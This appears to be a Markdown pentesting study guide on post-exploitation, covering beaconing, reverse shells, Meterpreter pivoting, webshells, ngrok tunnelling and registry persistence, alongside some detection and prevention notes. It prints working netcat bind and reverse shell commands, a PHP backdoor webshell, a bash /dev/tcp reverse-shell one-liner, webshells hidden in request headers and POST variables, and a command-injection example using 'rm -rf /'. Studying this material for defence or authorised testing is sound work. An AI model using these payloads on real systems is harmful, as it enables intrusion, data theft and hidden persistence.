# TABLE OF CONTENTS
1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#general)
2. [LINUX](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#linux)
3. [WINDOWS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#windows)

<br />

# GENERAL
## TABLE OF CONTENTS
1. [BEACONING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#beaconing)
2. [BIND VS REVERSE SHELL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#bind-vs-reverse-shell)
3. [ICMP TUNNELING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#icmp-tunneling)
4. [METERPRETER](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#meterpreter)
5. [WEBSHELL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#webshell)
6. [WEEVELY](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#weevely)
7. [NGROK](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#ngrok)


## BEACONING
## Info
- Network node that advertise its presence
- Can be legitimate (WAP, NTP, Auto update)
- Can be malicious (C2-communication, Botnet)

### Process
1. Malicious beacon uses ping/heartbeat to verfiy it is active
2. Attackers use DGA (Domain Generation Algorithm), Fast Flux DNS or Jitter
3. After successful Beaconing, C2 server send commands

### Command Channels for Beaconing
1. IRC: Declining trend because many organizations block it
2. HTTP/HTTPS: Mitigation via intercepting Proxy (MITM)
3. DNS
    - Effective C2 channel because no outside network needed
    - Instead it uses local DNS resolver
    - IOC1: Same query is repeated when bot checks into C2 server
    - IOC2: Commands within response query become longer
4. Social Media
    - Can allow "live off the land" (!)
    - Commands through Twitter / LinkedIn etc. (!)
5. Cloud: Botnet can use Google's App Engine to send C2 messages
6. Media/Document Files: Metadata within media files can contain C2 messages

<br />

## BIND VS REVERSE SHELL
## Info
### Bind Shell
- **The shell is bound to a port and awaits its execution**
- No interaction with started programs possible (e.g. wget, nano)
- Shell-rights subject to process rights. Privilege escalation often necessary 
- Bind Shells often trigger firewalls, because access to shells happens from outside to inside 

### Reverse Shell
- **The shell is established from target network (inside) to attacker server (outside) as it gets activated.**
- Firewalls often allow outbound traffic of reverse shells

## HowTo
### Bind Shell
- Victim Terminal: `nc -vnlp 4444 -e cmd.exe`
    -  -e = execute
- Kali Attacker: `nc [IPv4] 4444`

### Reverse Shell
- Kali Attacker: `nc -nvlp 443` (Listening often on port 80/TCP or 443/TCP)
- Victim: `nc -vn [IPv4] 443 -e cmd.exe`

<br />

## ICMP TUNNELING
## Info
### Why it works
- Typ 8: Echo Request
- Typ 0: Echo Reply
- RFC 792: Allows for an arbitrary data length for echo reply or echo request.
- Further Details: [https://dhavalkapil.com/icmptunnel/](https://dhavalkapil.com/icmptunnel/)

## HowTo
- Requirements (for both Attacker and Target)
- `apt install gcc / git / make`
- `git clone https://github.com/DhavalKapil/icmptunnel.git`

<br />

## METERPRETER
## Info
### Advantages
1. Works inside RAM
2. Utilizes Covert Channels (legitimate processes)
3. Encrypted communication possible (effective against IPS/IDS)
4. Staged payloads possible

## HowTo
### Basics
- `help`: command overview
- During session: Strg+Z / background --> create background session
- `sessions -l`: show existing sessions
- `sessions -u [session ID]`: upgrade to meterpreter session
- `sessions -i 2`: switch to session 2
- `download`: download from target onto local system (exp: /etc/shadow)
- `edit [file]`: open vim on target 

### Advanced Features 
#### Upload Payload (via meterpeter)
- via meterpreter session: `cd C:\ProgramData\Microsoft\Windows\Start Menu\Programme\Autostart`
- verify with "meterpreter pwd" the correct path on target
- upload [path/to/payload/on/kali]

#### Ping Sweep: 
- Detect hosts in subnet2 via target machine in subnet1 (that has access to subnet2)
   - msf: `use post/multi/gather/ping_sweep`
   - `set rhost [IPv4]` (IPv4 from subnet2 like 10.1.0.0/24)
   - `set session [id]` (use id from target in subnet1)
- Alternative: `use auxiliary/scanner/portscan/tcp` + specify ports

#### Remote TCP scanner
1. msf: `use auxiliary/scanner/portscan/tcp` & set ports + rhost
2. Because it's "auxiliary" and not "post", you need to set up a route beforehand
3. msf: `route add [target in subnet] [sessionid]` (Exp: route add 10.1.0.7 1)
4. Alternative via meterpreter session: `run autoroute -s [target in subnet]`
5. These routes are only effective inside mp session (!)
6. For the usage outside of meterpreter session you need to set up portforwarding
7. Meterpreter session: `portfwd add -l 80 -p 80 -r [target in subnet]`

#### Proxychains:

*Route tools' web traffic through socks proxy to target2 w/o portforwading (!)*

1. Meterpreter: have existing session to target1 & put session into background
2. msf: `use auxiliary/server/socks_proxy` & setup socks4a(127.0.0.1:123) & `run` & `jobs`
3. Meterpreter: `add autoroute -s [IPv4]` (IPv4 = target2 IP in subnet)
4. msf: `route print` (check routing table)
5. Kali Browser: set up socks proxy (127.0.0.1:123) (now you can browse on target2 machine)
6. `nano /etc/proxychains.conf`: add `socks 127.0.0.1 123` at the end of file
7. Kali CLI: `proxychains [command] [IPv4]` (target2 IP in subnet)

<br />

## PRIVILEGE OF ESCALATION (GENERAL)
## Info
- **config files**
    - watch out for config files which may contain sensitive data and/or passwords
- **tools**
    - check out which tools are installed on the victim machine
    - these tools may reveal a chance to escalate your privileges
- **system accounts/users**
    - check out which accounts have allowed shell access
    - system accounts (besides root) may have shell access even though their functionality does not require it

<br />

## WEBSHELL
## Info
- Script, which is written in language of target web server
   - PHP
   - Python
   - Ruby
   - Perl
   - ASP (Active Server Page)
   - Unix Shell Script
- Uploaded to enable remote access of the machine
- Servers that only host internal resources are also at risk
- Communication is simply over HTTP
- Usually installed via:
   - Document/file upload pages
   - Local File Include (LFI): Put webshell in page of webapp
   - Cross-site scripting (XSS)
   - Exposed Admin Interface (e.g. OWA/Outlook Web App, EAS/Exchange ActiveSync)

### How to Detect
- Web serve Access/Error logs
- Notice of unusual timestamps
- Search for common strings in files or filenames (passthru|exec|eval...)
- Webshell signature scanner
- Search for very long strings, which may indicate encoding
- Search for files that were modified in the recent X days
   - `find -name '*.php' -mtime -1 -ls`
- Search for htaccess modification (false filename-extension mapping)
   - `addType application/x-httpd-php .htaccess`
   - `addType application/x-httpd-php .jpg`


### Command Injection Prevention
- Wrong: `<?php system('ls ' . $_GET['path']); ?>`  --> ls ; rm -rf /
    - the commmand `ls` gets interrupted and the attacker can enter another command like `rm -rf /`, which will delete the entire directory 
- Good: `<?php system('ls ' . escapeshellarg($_GET['path'])); ?>` --> ls 'rm -rf /'
    - the execution of malicious code is prevented since it gets interpreted as string

### Best Practice
- Set `allow_url_include` to "false" (Code Injection Prevention)
- Use `file_get_contents` to load ads etc. on your website, if any (this will reduce the attack surface, but XSS is still possible)
- Configure .htaccess properly

## HowTo
### Return list of dangerous enabled functions
```
<?php

//print_r = print variable information in readable form

print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```

### Typical Webshell Commands
- `<?php system("whoami"); ?>`
- `<?php exec("whoami"); ?>`: Executes but returns nothing
- `<?php echo exec("whoami"); ?>`
- `<?php exec("whoami", $array); print_r($array); ?>`: Executes, returns output in array
- `<?php echo shell_exec("whoami"); ?>`: Executes, returns string
- `<?php passthru ("whoami"); ?>`: Executes, returns raw format
- ```<?php echo "<pre>`whoami`</pre>"); ?>```
- `<?php system($_GET['c']);?>`: www.example.com/demo/shell.php?c=whoami

### Example Webshells
```
<?php

// 1) Upload backdoor.php on web server
// 2) Enter URL --> http://example.com/backdoor.php?c=nc -e /bin/sh 10.10.10.7 4444

if(isset($_REQUEST['c'])){
        echo "<pre>";
        $c = ($_REQUEST['c']);
        system($c);
        echo "</pre>";
        die;
}
?>
```

- One liner: `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?>`
    - This webshell invokes an interactive bash shell 
    - Shell traffic is routed to attacker machine with example IPv4 10.0.0.10 at port 1234
    - `0>&1` = STDIN is redirected to STDOUT

### Hide Webshell Traffic
1. `<?php system($_SERVER['HTTP_USER_AGENT'])?>`: Modify HTTP_USER_AGENT accordingly
2. `<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>`: Hide traffic along with uncommon parameter HTTP_ACCEPT_LANGUAGE
3. `<?php $_=$_POST['1'];  $__=$_POST['2']; $_($__); ?>`
    - Send POST request with variable '1' = 'system' and variable '2' = 'cat /etc/passwd'
    - The term `$_($__)` becomes then `system('cat /etc/passwd')`

<br />

## WEEVELY
## Info
Check out: [https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

<br />

## NGROK
## Info
- Establish remote connection through Internet to LAN-target
- [https://ngrok.com/](https://ngrok.com/)

## HowTo
1. Download ngrok and sign up
2. Unzip ngrok
3. Enter `./ngrok authtoken [token]` 
4. `./ngrok tcp 8080`
5. New terminal shows ngrok session with public IP:port 
6. Open msfvenom: create payload with lhost and lport matching ngrok's public IP:port 
7. Open msf: Activate multi handler with lhost/lport according to ngrok session info (localhost:8080)
8. Execute payload on target machine to establish remote connection

<br />

# LINUX
## TABLE OF CONTENTS
1. [PRIVILEGE OF ESCALATION (LINUX)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#privilege-of-escalation-linux)

<br />

## PRIVILEGE OF ESCALATION (LINUX)

<br />

# WINDOWS
## TABLE OF CONTENTS
1. [PERSISTENCE (REGISTRY)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#persistence-registry)
2. [PRIVILEGE OF ESCALATION (WIN)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#privilege-of-escalation-win)

<br />

## PERSISTENCE (REGISTRY)
## Info
**Registry: Low-Level Database in Windows**

### Autorun Key Locations
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- **Run**: Initializes values asynchronously when loading from Registry
- **RunOnce**: Initializes values in order when loading from Registry
- Attackers can gain persistence by hiding data in these keys
- Alternative persistence location: `HKLM\SYSTEM\CurrentControlSet\Services`

### Recently Used Files Location
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
- Preinstalled "Regedit" doesn't show last modification by default --> Use **regdump** instead 
- Malware can change file extensions of executables
- Checkout here:
   - `HKEY_CLASSES_ROOT` (HKCR)
   - `HKEY\SOFTWARE\Classes`
   - `HKCU\SOFTWARE\Classes`

### Best Practice
- Check Windows Task Scheduler (if attacker scheduled tasks)
- Check Crontab (Linux)

<br />

## PRIVILEGE OF ESCALATION (WIN)

<br />


